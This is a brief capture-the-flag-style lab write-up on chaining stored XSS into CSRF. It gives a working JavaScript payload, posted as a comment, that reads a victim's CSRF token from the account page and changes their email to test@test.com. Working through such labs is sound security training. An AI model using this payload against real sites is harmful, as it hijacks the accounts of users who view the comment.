# Lab: Exploiting XSS to perform CSRF

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/01584a28-7efd-4aa9-b9a0-eaa2deb572e6)

## Solution

Log in using the given username and passowrd.
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/6d5ac389-fae7-4af0-bd8d-dc9c62a8986d)

If we try to change the email, it requires a hidden `CSRF` token.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/56e279c0-7c62-45ae-9b2d-930d83895e0a)

Post the following script as comment which makes any user who views the comment to change their email to **test@test.com**.

```Javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

Posting the comment finishes the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/b415bc35-e8a0-44c3-bba8-96d7cabc7d5f)
